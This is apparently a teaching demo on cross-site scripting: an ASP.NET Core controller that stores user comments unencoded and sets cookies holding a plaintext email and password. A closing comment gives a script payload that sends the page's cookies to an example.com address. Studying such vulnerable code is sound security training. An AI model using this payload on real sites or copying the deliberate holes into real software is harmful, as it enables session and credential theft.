using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text.Encodings.Web;
using System.Threading.Tasks;
using XssWeb.Models;

namespace XssWeb.Controllers
{
    public class HomeController : Controller
    {
        private readonly ILogger<HomeController> _logger;
        private HtmlEncoder _htmlEncoder;
        private JavaScriptEncoder _javaScriptEncoder;
        private UrlEncoder _urlEncoder;

        public HomeController(ILogger<HomeController> logger, HtmlEncoder htmlEncoder, JavaScriptEncoder javaScriptEncoder, UrlEncoder urlEncoder)
        {
            _logger = logger;
            _htmlEncoder = htmlEncoder;
            _javaScriptEncoder = javaScriptEncoder;
            _urlEncoder = urlEncoder;
        }

        public IActionResult CommentAdd()
        {
            HttpContext.Response.Cookies.Append("email", "ekiznurettin@gmail.com");
            HttpContext.Response.Cookies.Append("password", "123456");
            if (System.IO.File.Exists("comment.txt"))
            {
                ViewBag.comment = System.IO.File.ReadAllLines("comment.txt");
            }
            return View();
        }
        [ValidateAntiForgeryToken]
        [HttpPost]
        public IActionResult CommentAdd(string name, string email, string comment)
        {
            // string encodeName =    _urlEncoder.Encode(name);

            ViewBag.name = name;
            ViewBag.email = email;
            ViewBag.comment = comment;

            System.IO.File.AppendAllText("comment.txt", $"{name}-{email}-{comment}\n");

            return RedirectToAction("CommentAdd");
        }

        public IActionResult Login(string returnUrl = "/")
        {
            TempData["ReturnUrl"] = returnUrl;
            return View();
        }
        [HttpPost]
        public IActionResult Login(string email, string password)
        {
            string returnUrl = TempData["ReturnUrl"].ToString();
            //email password kontrolü
            if (Url.IsLocalUrl(returnUrl))
            {
                return Redirect(returnUrl);
            }
            return Redirect("/");
        }

        public IActionResult Index()
        {
            return View();
        }

        public IActionResult Privacy()
        {
            return View();
        }

        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
        public IActionResult Error()
        {
            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
        }
    }
}


/*
 <script>new Image().src="http://www.example.com/cookieoku?hesapbilgisi="+document.cookie</script> // xss saldırısı için komut
 */